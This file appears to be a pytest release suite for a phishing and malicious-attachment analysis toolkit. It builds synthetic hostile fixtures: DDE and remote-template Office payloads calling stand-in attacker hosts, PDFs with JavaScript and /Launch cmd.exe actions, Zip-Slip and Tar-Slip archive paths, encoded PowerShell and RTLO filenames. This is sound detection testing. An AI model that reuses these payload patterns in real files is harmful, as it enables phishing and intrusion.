# -*- coding: utf-8 -*-
"""
Комплекс статического анализа и форензики электронной почты (OMSA v1.0 / Red Edition).
Модуль: test_release_readiness_matrix.py
Назначение: Комплексный релизный тест-сьют (Universal Email & Attachment Verification Matrix,
проверка всех точек входа CLI/GUI/NativeHost, отказоустойчивости и безопасности).

__author__ = "AG-K08 (@And_8)"
__email__ = "mznxncbv888@gmail.com"
__version__ = "4.0 (Red Edition / OMSA v1.0)"
__year__ = "2026"
__license__ = "Proprietary / Internal Security Audit"
"""
from __future__ import annotations

import base64
import compileall
from email.message import EmailMessage
import io
import json
import os
import struct
import subprocess
import sys
import tarfile
import types
import zipfile
from pathlib import Path
from unittest.mock import patch

import pytest

PROJECT_ROOT = Path(__file__).resolve().parents[1]
CORE_ENGINES = PROJECT_ROOT / "01_Core_Engines"
OMSA_DIR = PROJECT_ROOT / "02_Office_Macro_Analyzer_OMSA"
CLIENTS_DIR = PROJECT_ROOT / "03_Clients_and_Integrations"
DIST_DIR = CLIENTS_DIR / "Distributable"
TB_GUARD_DIR = CLIENTS_DIR / "ThunderbirdPhishingGuard"
SAMPLES_DIR = PROJECT_ROOT / "06_Audit_Tests_and_Samples"

for p in (CORE_ENGINES, OMSA_DIR):
    if p.exists() and str(p) not in sys.path:
        sys.path.insert(0, str(p))

import analyze_email_full as aef  # noqa: E402
import analyze_threats as at  # noqa: E402
import office_document_threats as odt  # noqa: E402
import robust_analyzer as ra  # noqa: E402
from phish_engine import (  # noqa: E402
    PhishingEngine,
    HeadersChecker,
    BodyChecker,
    AttachmentsChecker,
    QuishingChecker,
    ThreatScorer,
    Severity,
)


# ==============================================================================
# 1. СТАТИЧЕСКАЯ ВЕРИФИКАЦИЯ КОДОВОЙ БАЗЫ (SYNTAX & COMPILEALL)
# ==============================================================================

def test_compileall_entire_project():
    """Проверка отсутствия синтаксических ошибок во всех .py файлах проекта."""
    ok = compileall.compile_dir(
        str(PROJECT_ROOT),
        quiet=1,
        rx=None,
    )
    assert ok, "compileall обнаружил синтаксические ошибки в проекте"


# ==============================================================================
# 2. UNIVERSAL EMAIL MATRIX (ФОРМАТЫ ПИСЕМ, КОДИРОВКИ, MIME, ВЛОЖЕННЫЕ RFC822)
# ==============================================================================

@pytest.mark.parametrize(
    "charset,text_sample",
    [
        ("utf-8", "Срочно подтвердите свой пароль от корпоративной почты https://evil-login.top/auth"),
        ("windows-1251", "Уважаемый коллега, ваш аккаунт заблокирован! Срочно введите свой пароль: http://185.220.101.9/login"),
        ("koi8-r", "Срочно подтвердите свой пароль иначе аккаунт будет заблокирован в течение 24 часов"),
        ("iso-8859-1", "Urgent action required: verify your account password immediately before account suspended"),
    ],
)
def test_email_encodings_and_charsets(tmp_path: Path, charset: str, text_sample: str):
    """Тестирование корректного декодирования различных кодировок (UTF-8, CP1251, KOI8-R, ISO-8859-1)."""
    raw_body = text_sample.encode(charset, errors="replace")
    b64_body = base64.b64encode(raw_body).decode("ascii")
    eml_bytes = (
        f"From: Admin <admin@enterprise-corp.com>\r\n"
        f"To: user@enterprise-corp.com\r\n"
        f"Subject: Security Notice\r\n"
        f"MIME-Version: 1.0\r\n"
        f"Content-Type: text/plain; charset=\"{charset}\"\r\n"
        f"Content-Transfer-Encoding: base64\r\n\r\n"
        f"{b64_body}\r\n"
    ).encode("ascii")

    eml_file = tmp_path / f"test_{charset}.eml"
    eml_file.write_bytes(eml_bytes)

    engine = PhishingEngine(protected_domains=["enterprise-corp.com"])
    res = engine.analyze_email_file(eml_file)
    assert res.verdict in ("CLEAN", "SUSPICIOUS", "MALICIOUS")
    assert any(f.id == "BODY_PHISH_KEYWORDS" for f in res.findings)


def test_email_invalid_and_unknown_charset_resilience(tmp_path: Path):
    """Проверка устойчивости к битым/неизвестным кодировкам в заголовке Content-Type."""
    eml_bytes = (
        b"From: sender@company.com\r\n"
        b"To: user@company.com\r\n"
        b"Subject: Charset Torture Test\r\n"
        b"MIME-Version: 1.0\r\n"
        b"Content-Type: text/plain; charset=\"unknown-invalid-charset-9999\"\r\n\r\n"
        b"Urgent: confirm your password at https://bit.ly/phish123\r\n"
    )
    eml_file = tmp_path / "unknown_charset.eml"
    eml_file.write_bytes(eml_bytes)

    # 1. PhishingEngine не должен падать с LookupError
    engine = PhishingEngine()
    res = engine.analyze_email_file(eml_file)
    assert any(f.id == "BODY_URL_SHORTENER" for f in res.findings)

    # 2. FullEmailAnalyzer не должен падать с LookupError
    analyzer = aef.FullEmailAnalyzer(eml_file)
    analyzer.extract_dir.mkdir(parents=True, exist_ok=True)
    analyzer._load_eml()
    assert "bit.ly" in analyzer._body_text


def test_email_nested_rfc822_and_multipart_structures(tmp_path: Path):
    """Тестирование вложенных писем (message/rfc822 — пересланное письмо внутри .eml) и multipart."""
    inner_eml = (
        b"From: attacker@evil.xyz\r\n"
        b"Return-Path: <bounce@another-domain.ru>\r\n"
        b"Subject: Forwarded Invoice\r\n"
        b"Content-Type: text/html; charset=utf-8\r\n\r\n"
        b"<html><body><a href=\"https://steal-creds.top/login\">https://enterprise-corp.com/login</a></body></html>\r\n"
    )
    outer = EmailMessage()
    outer["From"] = "colleague@enterprise-corp.com"
    outer["To"] = "analyst@enterprise-corp.com"
    outer["Subject"] = "FW: Check this email"
    outer.set_content("Коллега, посмотри пересланное сообщение.")
    outer.add_attachment(inner_eml, maintype="message", subtype="rfc822", filename="forwarded.eml")

    eml_path = tmp_path / "nested_rfc822.eml"
    eml_path.write_bytes(outer.as_bytes())

    # Проверка через PhishingEngine
    engine = PhishingEngine(protected_domains=["enterprise-corp.com"])
    res = engine.analyze_email_file(eml_path)
    ids = [f.id for f in res.findings]
    assert "BODY_MISMATCHED_LINK" in ids or "BODY_RISKY_TLD" in ids

    # Проверка через FullEmailAnalyzer
    analyzer = aef.FullEmailAnalyzer(eml_path)
    analyzer.extract_dir = tmp_path / "extracted_nested"
    analyzer.extract_dir.mkdir(parents=True, exist_ok=True)
    analyzer._load_eml()
    assert len(analyzer.attachments) >= 1


def test_email_empty_body_and_corrupted_mime_boundaries(tmp_path: Path):
    """Проверка писем без тела, без заголовков и с оборванными MIME-границами."""
    # 1. Пустое не-multipart письмо
    empty_eml = tmp_path / "empty.eml"
    empty_eml.write_bytes(b"From: a@b.com\r\nSubject: Empty\r\n\r\n")

    orch = at.PhishingOrchestrator(str(empty_eml))
    try:
        orch.analyze_email(str(empty_eml))
        assert orch.report_data["email"]["subject"] == "Empty"
    finally:
        orch.cleanup()

    # 2. Оборванный multipart boundary
    broken_mime = tmp_path / "broken_mime.eml"
    broken_mime.write_bytes(
        b"From: bad@actor.com\r\n"
        b"Content-Type: multipart/mixed; boundary=\"BOUNDARY_123\"\r\n\r\n"
        b"--BOUNDARY_123\r\n"
        b"Content-Type: text/plain\r\n\r\n"
        b"Unclosed boundary body with link http://192.0.2.55/payload.exe\r\n"
        # намеренно отсутствует закрывающий --BOUNDARY_123--
    )
    engine = PhishingEngine()
    res = engine.analyze_email_file(broken_mime)
    assert any(f.id == "BODY_IP_URL" for f in res.findings)


def test_msg_format_handling_via_mock_and_fallback(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    """Тестирование обработки формата Outlook .msg (OLE2 контейнер + fallback при повреждении)."""
    monkeypatch.chdir(tmp_path)
    # 1. Поврежденный/синтетический .msg с OLE2-сигнатурой (тест fallback в PhishingEngine)
    fake_msg = tmp_path / "corrupted_outlook.msg"
    fake_msg.write_bytes(
        b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64 +
        b"From: attacker@gmail.com\r\nSubject: Urgent Invoice\r\n"
        b"Please open https://rollercost.z13.web.core.windows.net/login.html#user@enterprise-corp.com\r\n"
    )
    engine = PhishingEngine()
    res = engine.analyze_email_file(fake_msg)
    assert any("(.msg)" in u for u in res.uninspected)
    assert any(f.id == "BODY_CREDENTIAL_HARVEST_URL" for f in res.findings)

    # 2. Валидный вызов analyze_threats.py и robust_analyzer.py с моком модуля extract_msg
    class DummyAttachment:
        longFilename = "invoice..pdf.exe"
        shortFilename = "invoic~1.exe"
        data = b"MZ\x90\x00\x03\x00\x00\x00"

        def getFilename(self):
            return self.longFilename

    class DummyMsg:
        subject = "Оплата счета по тендеру"
        sender = "buch@yandex.ru"
        to = "director@enterprise-corp.com"
        cc = ""
        date = "Fri, 23 Oct 2026 09:00:00 +0300"
        messageId = "<123@yandex.ru>"
        body = "Срочно оплатите счет во вложении https://bit.ly/pay-now"
        htmlBody = "<html><body><a href='https://bit.ly/pay-now'>Оплатить</a></body></html>".encode("utf-8")
        header = None
        headerDict = {"Return-Path": "<bounce@evil.com>", "Reply-To": "hacker@gmail.com"}
        attachments = [DummyAttachment()]

        def close(self):
            pass

    mock_extract_msg = types.ModuleType("extract_msg")
    mock_extract_msg.Message = lambda path: DummyMsg()

    with patch.dict(sys.modules, {"extract_msg": mock_extract_msg}), patch.object(ra, "extract_msg", mock_extract_msg):
        orch = at.PhishingOrchestrator(str(fake_msg))
        try:
            orch.analyze_email(str(fake_msg))
            assert orch.report_data["email"]["subject"] == "Оплата счета по тендеру"
            assert len(orch.report_data["attachments"]) == 1
        finally:
            orch.cleanup()

        rob = ra.ThreatAnalyzer(reports_dir=str(tmp_path / "reports"))
        json_res = json.loads(rob.analyze(str(fake_msg)))
        assert "corrupted_outlook.msg" in json_res["analyzed_files"]


# ==============================================================================
# 3. UNIVERSAL ATTACHMENT MATRIX (OFFICE, PDF, ARCHIVES, IMAGES, LNK, SMUGGLING)
# ==============================================================================

def test_office_documents_matrix_clean_dde_template_ole(tmp_path: Path):
    """Тестирование документов Office: чистый .docx, Remote Template Injection, DDEAUTO, внешний OLE."""
    # 1. Чистый .docx
    clean_docx = tmp_path / "clean_report.docx"
    with zipfile.ZipFile(clean_docx, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"></Types>')
        zf.writestr("word/document.xml", '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Hello World</w:t></w:r></w:p></w:body></w:document>')

    res_clean = odt.scan_office_threats(clean_docx)
    assert res_clean["indicators"] == []

    # 2. .docx с Remote Template Injection + DDEAUTO
    mal_docx = tmp_path / "malicious_template_dde.docx"
    with zipfile.ZipFile(mal_docx, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(
            "word/_rels/settings.xml.rels",
            '<?xml version="1.0"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            'Target="http://evil-c2.ru/payload.dotm" TargetMode="External"/>'
            '</Relationships>',
        )
        zf.writestr(
            "word/document.xml",
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            '<w:instrText>DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe"</w:instrText>'
            '</w:document>',
        )

    res_mal = odt.scan_office_threats(mal_docx)
    inds_text = " | ".join(res_mal["indicators"]).lower()
    assert "template" in inds_text or "внешний" in inds_text
    assert "dde" in inds_text

    # 3. Проверка через AttachmentsChecker (PhishingEngine)
    att_checker = AttachmentsChecker()
    findings = att_checker.check_file("malicious_template_dde.docx", mal_docx.read_bytes())
    f_ids = [f.id for f in findings]
    assert "ATT_OFFICE_TEMPLATE_INJECTION" in f_ids
    assert "ATT_OFFICE_DDE_EXEC" in f_ids


def test_omsa_block3_pcode_stomping_indicator_fix(tmp_path: Path):
    """Регрессионный тест исправленного бага в OMSA Block 3 (Pydantic ValidationError при ratio > PCODE_STOMPING_RATIO_HIGH)."""
    from modules.block3_pcode import run as run_block3
    from core.config import AnalyzerConfig
    from core.models import ThreatLevel

    # Синтетический вывод pcodedmp в точном формате FuncDefn (Sub AutoOpen) с 25 инструкциями и 1 опасным вызовом Shell
    fake_pcode_output = (
        "Processing stream\n"
        "FuncDefn (Sub AutoOpen)\n"
        + "\n".join([f"Line #{i}:\n\tLd x_{i}" for i in range(25)])
        + "\n\tArgsCall Shell 0x0001\n"
        + "\tEndSub\n"
    )
    block2_raw = {
        "all_functions": ["AutoOpen"],
        "modules": [
            {
                "name": "NewMacros",
                "function_line_counts": {"AutoOpen": 6},
            }
        ],
    }

    dummy_bin = tmp_path / "vbaProject.bin"
    dummy_bin.write_bytes(b"dummy")
    cfg = AnalyzerConfig()

    with patch("modules.block3_pcode._run_pcodedmp", return_value=fake_pcode_output):
        res_b3 = run_block3(dummy_bin, block2_raw, vba_stomping_detected=True, cfg=cfg)
        assert res_b3.success is True
        assert any(ind.indicator_id.startswith("B3.STOMPING_RATIO.") for ind in res_b3.threat_indicators)
        assert any(ind.level == ThreatLevel.CRITICAL for ind in res_b3.threat_indicators)


def test_pdf_matrix_clean_js_launch_objstm_corrupted(tmp_path: Path):
    """Тестирование всех вариантов PDF: чистый, с /JavaScript + /OpenAction + /Launch, сжатый /ObjStm и поврежденный."""
    analyzer = aef.FullEmailAnalyzer(tmp_path / "dummy.eml")

    # 1. Чистый PDF
    clean_pdf = tmp_path / "clean.pdf"
    clean_pdf.write_bytes(b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n%%EOF\n")
    info_clean = analyzer._analyze_pdf(clean_pdf)
    assert analyzer._pdf_indicators(info_clean) == []

    # 2. Вредоносный PDF с /OpenAction, /JavaScript, /Launch и /EmbeddedFiles + оверлей после %%EOF
    mal_pdf = tmp_path / "exploit.pdf"
    mal_pdf.write_bytes(
        b"%PDF-1.7\n"
        b"1 0 obj\n<< /Type /Catalog /OpenAction << /S /JavaScript /JS (app.launchURL('http://evil.ru')) >> /Names << /EmbeddedFiles << >> >> >>\nendobj\n"
        b"2 0 obj\n<< /S /Launch /Win << /F (cmd.exe) >> >>\nendobj\n"
        b"%%EOF\n"
        + b"MZ" + b"\x90" * 600
    )
    info_mal = analyzer._analyze_pdf(mal_pdf)
    inds = analyzer._pdf_indicators(info_mal)
    assert "PDF: обнаружен JavaScript" in inds
    assert "PDF: обнаружен /Launch" in inds
    assert "PDF: встроенный файл" in inds

    # Проверка через AttachmentsChecker
    att_checker = AttachmentsChecker()
    att_findings = att_checker.check_file("exploit.pdf", mal_pdf.read_bytes())
    att_ids = [f.id for f in att_findings]
    assert "ATT_PDF_JAVASCRIPT" in att_ids
    assert "ATT_PDF_LAUNCH_ACTION" in att_ids
    assert "ATT_PDF_OPEN_ACTION" in att_ids
    assert "ATT_PDF_EMBEDDED_FILE" in att_ids

    # 3. Поврежденный/обрезанный PDF
    corrupt_pdf = tmp_path / "corrupt.pdf"
    corrupt_pdf.write_bytes(b"%PDF-1.5\n1 0 obj\n<< /Filter /FlateDecode /Length 9999 >>\nstream\n\xff\xfe\xfd\x00endstream")
    info_corrupt = analyzer._analyze_pdf(corrupt_pdf)
    assert isinstance(info_corrupt, dict)


def test_archives_matrix_zip_tar_gz_slip_and_bombs(tmp_path: Path):
    """Тестирование архивов: легитимный ZIP/TAR.GZ, Zip-Slip, Tar-Slip, Zip-Bomb, Tar-Bomb."""
    eml_dummy = tmp_path / "case.eml"
    eml_dummy.write_bytes(b"From: a@b.c\r\n\r\nbody")
    analyzer = aef.FullEmailAnalyzer(eml_dummy)
    analyzer.extract_dir = tmp_path / "extract"
    analyzer.extract_dir.mkdir(parents=True, exist_ok=True)

    # 1. ZIP с попыткой Zip-Slip (../../evil.exe)
    zip_slip = tmp_path / "slip.zip"
    with zipfile.ZipFile(zip_slip, "w") as zf:
        zf.writestr("../../evil.exe", b"MZ_PAYLOAD")
    extracted_slip = analyzer._extract_archive(zip_slip, "slip.zip")
    assert extracted_slip == []
    assert any("Zip Slip" in w["message"] for w in analyzer.report["warnings"])

    # 2. TAR.GZ с вложенным вредоносным скриптом
    tar_gz_ok = tmp_path / "bundle.tar.gz"
    with tarfile.open(tar_gz_ok, "w:gz") as tf:
        data = b"powershell -enc AAAA"
        ti = tarfile.TarInfo(name="nested/dropper.ps1")
        ti.size = len(data)
        tf.addfile(ti, io.BytesIO(data))
    extracted_tar = analyzer._extract_archive(tar_gz_ok, "bundle.tar.gz")
    assert len(extracted_tar) == 1
    assert extracted_tar[0].ext == ".ps1"

    # 3. TAR с попыткой Tar-Slip (../../../etc/passwd)
    tar_slip = tmp_path / "tar_slip.tar"
    with tarfile.open(tar_slip, "w") as tf:
        data = b"root:x:0:0"
        ti = tarfile.TarInfo(name="../../../etc/passwd")
        ti.size = len(data)
        tf.addfile(ti, io.BytesIO(data))
    extracted_tarslip = analyzer._extract_archive(tar_slip, "tar_slip.tar")
    assert extracted_tarslip == []
    assert any("Tar Slip" in w["message"] for w in analyzer.report["warnings"])


def test_images_stego_overlay_and_multi_doc_staged_assembly():
    """Тестирование картинок со скрытым оверлеем после маркера EOI/IEND, перевернутым PE и композитной сборки (Multi-Doc)."""
    checker = AttachmentsChecker()

    # 1. JPEG с данными после FF D9 (Overlay + маркеры Remcos `<<STT>>` / `<<D>>`)
    jpg_with_overlay = (
        b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
        b"\xff\xd9"
        + b"<<STT>>" + b"A" * 300 + b"<<D>>"
    )
    f_img = checker.check_file("scan_photo.jpg", jpg_with_overlay)
    f_ids = [f.id for f in f_img]
    assert "ATT_IMAGE_OVERLAY_PAYLOAD" in f_ids

    # 2. Перевернутый PE (Reversed MZ -> ZM)
    reversed_pe = b"\x00\x00PE" + b"\x90" * 120 + b"ZM"
    f_rev = checker.check_file("chunk.dat", reversed_pe)
    assert any(f.id == "ATT_REVERSED_PE_PAYLOAD" for f in f_rev)

    # 3. Multi-Document Staged Assembly (перекрестные ссылки + команды сборки + оверлеи)
    doc1 = b"%PDF-1.4\n%%EOF\n" + b"copy /b payload_part2.pdf + chunk out.exe " + b"A" * 100
    doc2 = b"%PDF-1.4\n%%EOF\n" + b"edoc sod ni nur eb tonnac margorp siht" + b"B" * 100
    cluster_findings = checker.check_attachments_cluster([("payload_part1.pdf", doc1), ("payload_part2.pdf", doc2)])
    c_ids = [f.id for f in cluster_findings]
    assert "ATT_CROSS_FILE_REFERENCE" in c_ids
    assert "ATT_ASSEMBLY_COMMANDS" in c_ids
    assert "ATT_PDF_SUSPICIOUS_OVERLAY" in c_ids
    assert "ATT_REVERSED_PE_PAYLOAD" in c_ids


def test_zero_byte_and_special_windows_filenames(tmp_path: Path):
    """Проверка 0-байтовых вложений, RTLO, двойных расширений и запрещенных в Windows символов в именах."""
    msg = EmailMessage()
    msg["From"] = "test@example.com"
    msg["To"] = "sec@enterprise-corp.com"
    msg["Subject"] = "Weird Attachments"
    msg.set_content("Body")
    msg.add_attachment(b"", maintype="application", subtype="octet-stream", filename="empty_0byte.bin")
    msg.add_attachment(b"MZ\x90\x00", maintype="application", subtype="octet-stream", filename='inv<>:"|?*\u202egpj.exe')

    eml_path = tmp_path / "weird_att.eml"
    eml_path.write_bytes(msg.as_bytes())

    analyzer = aef.FullEmailAnalyzer(eml_path)
    report = analyzer.run()
    assert report["verdict"] in ("SUSPICIOUS", "MALICIOUS")
    assert len(report["attachments"]) >= 2


# ==============================================================================
# 4. ТОЧКИ ВХОДА CLI, DISTRIBUTABLE LAUNCHER, NATIVE HOST И GUI
# ==============================================================================

def test_cli_entry_points_execution(tmp_path: Path):
    """Запуск ключевых CLI-скриптов как подпроцессов для проверки их работоспособности."""
    sample_docx = SAMPLES_DIR / "test_document.docx"

    # 1. 02_Office_Macro_Analyzer_OMSA/office_analyzer.py на .docx
    out_omsa = tmp_path / "omsa_out"
    proc_omsa = subprocess.run(
        [sys.executable, str(OMSA_DIR / "office_analyzer.py"), str(sample_docx), "--offline", "--output", str(out_omsa)],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        timeout=60,
    )
    assert proc_omsa.returncode in (0, 1, 2), f"OMSA failed: {proc_omsa.stderr}"
    assert list(out_omsa.rglob("test_document_report.txt")), f"Report not generated in {out_omsa}"
    assert list(out_omsa.rglob("test_document_report_verbose.txt")), f"Verbose report not generated in {out_omsa}"

    # 2. 03_Clients_and_Integrations/Distributable/main_launcher.py
    out_dist = tmp_path / "dist_out"
    proc_dist = subprocess.run(
        [sys.executable, str(DIST_DIR / "main_launcher.py"), str(sample_docx), "--offline", "-o", str(out_dist)],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        timeout=60,
    )
    assert proc_dist.returncode == 0, f"Distributable main_launcher failed: {proc_dist.stderr}"

    # 3. 01_Core_Engines/metadata_hex_scanner.py на синтетическом PDF с GPS и HEX
    pdf_sample = tmp_path / "sample_meta_hex.pdf"
    pdf_sample.write_bytes(b"%PDF-1.4\n1 0 obj\n<< /Author (55.7558, 37.6173) /Keywords (4d5a90000300000004000000ffff0000b8000000) >>\nendobj\n%%EOF\n")
    proc_meta = subprocess.run(
        [sys.executable, str(CORE_ENGINES / "metadata_hex_scanner.py"), str(pdf_sample)],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        timeout=30,
    )
    assert proc_meta.returncode == 0
    assert "GPS COORDINATES FOUND" in proc_meta.stdout

    # 4. 01_Core_Engines/safe_office_deep_scan.py
    proc_safe = subprocess.run(
        [sys.executable, str(CORE_ENGINES / "safe_office_deep_scan.py"), str(sample_docx)],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        timeout=30,
    )
    assert proc_safe.returncode == 0


def test_thunderbird_native_messaging_host_protocol(tmp_path: Path):
    """Интеграционный тест Native Messaging моста thunderbird_phishing_host.py (stdio binary framing)."""
    host_script = TB_GUARD_DIR / "thunderbird_phishing_host.py"
    req_payload = {
        "action": "analyze",
        "requestId": "test-req-001",
        "eml": (
            "From: Fake Support <support@gmail.com>\r\n"
            "Reply-To: hacker@evil.top\r\n"
            "Subject: Срочно подтвердите пароль!\r\n"
            "Content-Type: text/plain; charset=utf-8\r\n\r\n"
            "Ваш аккаунт заблокирован. Перейдите по ссылке: https://bit.ly/steal-pass\r\n"
        ),
    }
    encoded = json.dumps(req_payload).encode("utf-8")
    stdin_bytes = struct.pack("@I", len(encoded)) + encoded

    env = os.environ.copy()
    env["TB_GUARD_LOG"] = str(tmp_path / "tb_host_debug.log")

    proc = subprocess.run(
        [sys.executable, str(host_script)],
        input=stdin_bytes,
        cwd=str(tmp_path),
        capture_output=True,
        timeout=60,
        env=env,
    )
    assert proc.returncode == 0, f"Native host crashed: {proc.stderr.decode('utf-8', errors='replace')}"
    assert len(proc.stdout) > 4, "Native host did not return framed response"

    resp_len = struct.unpack("@I", proc.stdout[:4])[0]
    resp_json = json.loads(proc.stdout[4 : 4 + resp_len].decode("utf-8"))
    assert resp_json["success"] is True
    assert resp_json["requestId"] == "test-req-001"
    assert resp_json["verdict"] in ("SUSPICIOUS", "MALICIOUS")


def test_gui_mail_forensic_pro_headless_smoke():
    """Проверка импорта и инициализации GUI-приложения MailForensic Pro в тестовом режиме."""
    app_dir = CLIENTS_DIR / "Analyzer_App"
    if str(app_dir) not in sys.path:
        sys.path.insert(0, str(app_dir))
    import mail_forensic_pro as mfp

    assert hasattr(mfp, "FishingAnalyzerGUI")
    assert Path(mfp.SCRIPTS_DIR).exists()
